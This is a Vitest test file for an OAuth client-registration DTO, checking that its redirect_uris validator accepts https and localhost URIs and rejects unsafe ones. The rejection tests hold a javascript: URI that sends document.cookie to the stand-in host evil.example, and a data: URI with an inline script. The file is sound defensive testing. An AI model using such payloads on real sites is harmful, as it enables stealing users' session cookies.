import {
    describe, it, expect
} from 'vitest';
import {validate} from 'class-validator';
import {RegisterClientDto} from '#oauth/dto/register-client.dto.js';

const validDto = (): RegisterClientDto => {
    const dto = new RegisterClientDto();
    dto.client_name = 'GitHub Copilot';
    dto.redirect_uris = ['https://github.com/copilot/oauth/callback'];
    return dto;
};

describe('RegisterClientDto', () => {
    it('passes with a valid https redirect_uri', async () => {
        const errors = await validate(validDto());
        expect(errors).toHaveLength(0);
    });

    it('passes with a localhost http redirect_uri (no TLD required, for local testing)', async () => {
        const dto = validDto();
        dto.redirect_uris = ['http://localhost:9999/callback'];
        const errors = await validate(dto);
        expect(errors).toHaveLength(0);
    });

    it('rejects a javascript: redirect_uri — the scheme this validator exists to block', async () => {
        const dto = validDto();
        dto.redirect_uris = ["javascript:fetch('https://evil.example/c/'+document.cookie)"];
        const errors = await validate(dto);
        expect(errors.some(e => e.property === 'redirect_uris')).toBe(true);
    });

    it('rejects a data: redirect_uri', async () => {
        const dto = validDto();
        dto.redirect_uris = ['data:text/html,<script>alert(1)</script>'];
        const errors = await validate(dto);
        expect(errors.some(e => e.property === 'redirect_uris')).toBe(true);
    });

    it('rejects a protocol-less redirect_uri — pins down require_protocol: true, not just the protocol allowlist', async () => {
        const dto = validDto();
        dto.redirect_uris = ['evil.example.com/callback'];
        const errors = await validate(dto);
        expect(errors.some(e => e.property === 'redirect_uris')).toBe(true);
    });

    it('rejects when redirect_uris is empty', async () => {
        const dto = validDto();
        dto.redirect_uris = [];
        const errors = await validate(dto);
        expect(errors.some(e => e.property === 'redirect_uris')).toBe(true);
    });

    it('rejects when client_name is empty', async () => {
        const dto = validDto();
        dto.client_name = '';
        const errors = await validate(dto);
        expect(errors.some(e => e.property === 'client_name')).toBe(true);
    });
});
